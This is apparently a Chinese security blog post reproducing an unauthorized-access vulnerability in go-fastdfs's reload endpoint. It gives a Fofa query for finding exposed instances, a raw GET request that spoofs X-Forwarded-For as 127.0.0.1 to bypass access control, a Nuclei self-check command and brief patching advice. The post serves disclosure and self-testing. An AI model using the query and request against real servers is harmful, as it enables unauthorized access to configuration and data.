#  漏洞复现｜Go-fastdfs reload 存在未授权访问漏洞  
 Poc复现   2026-10-29 09:32  
  
   
  
# 免责声明  
> 「此公众号所分享的网络安全知识、信息及工具皆来源互联网公开收集整理，仅供学习和研究使用，请勿用于非法测试活动。由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，产生的一切后果由读者自行承担，皆与本公众号及文章作者无关、不负任何责任！！！」「如有内容侵权，请联系我们删除处理。谢谢合作！！！」  
  
# 漏洞概述  
> Go-fastdfs reload 存在未授权访问漏洞，导致数据信息泄露或者导致服务器被控制。  
  
# 影响范围  
> Go-fastdfs  
  
# 空间测绘  
### Fofa  
```
title="go-fastdfs"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScyyT7auPrQlKx35j6CqNvicArEpicsAzlTaWiauVz7M7qUlzgiaVucffZNEkPkHRO5iaDIfJ30JdO5gTkVcNS91CGj3EklyX4pJWHJU/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
#### Poc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsScx44sgJce7jtJIORxR7sCexSjV3mCrZ8LDJ3aTMyW5taH0Kciavicfkiciaxf6BnO6WpEfYDibWwrVZCgJricywF6FVPyCN27OmkYR1o/640?wx_fmt=png&from=appmsg "")  
```
GET /group1/reload?action=get HTTP/1.1Host:127.0.0.1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Accept: */*X-Forwarded-for: 127.0.0.1
```  
# 漏洞自查  
#### Nuclei  
```
nuclei.exe -u 目标URL -stats -silent -t gofastdfs-reload-unauth.yaml  
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScwf1Jk5lAT1Ag7LRWXH6Bu4ibAn1XQkRMUCCicSwd6l7UkyU8TmyK1pKepMydugvMpfnx5yeCjS8ZZfh2NHA5SZo77vDKUvSXL3Y/640?wx_fmt=png&from=appmsg "")  
# 修复建议  
> • 建议联系厂商打补丁或升级版本。• 增加Web应用防火墙防护。  
  
### poc免费获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Qvo4lzibsSczfgTLFickTOia2iaDF7huwHmzz0by5LwAjeZN4X05OVj9IYicQnjibX8DVn2P3sWxlIZlM0TiaRmBeGChGBOBVicd3nzZcjnyFpVzzG0/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
  
  
